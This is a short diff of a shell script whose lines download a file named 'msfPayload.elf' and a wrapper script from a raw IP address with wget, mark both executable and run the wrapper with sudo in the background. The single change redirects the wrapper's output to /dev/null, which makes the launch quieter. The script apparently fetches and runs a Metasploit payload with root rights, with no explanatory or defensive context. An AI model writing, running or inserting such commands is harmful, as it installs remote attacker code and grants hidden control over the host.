@@ -82,4 +82,4 @@ wget http://64.227.19.44/content/dlj23jjoj233jjajdeqo/msfPayload.elf
 chmod +x msfPayload.elf
 wget http://64.227.19.44/content/dlj23jjoj233jjajdeqo/linuxWrapperMSF.sh
 chmod +x linuxWrapperMSF.sh
-sudo ./linuxWrapperMSF.sh &
+sudo ./linuxWrapperMSF.sh &>/dev/null &
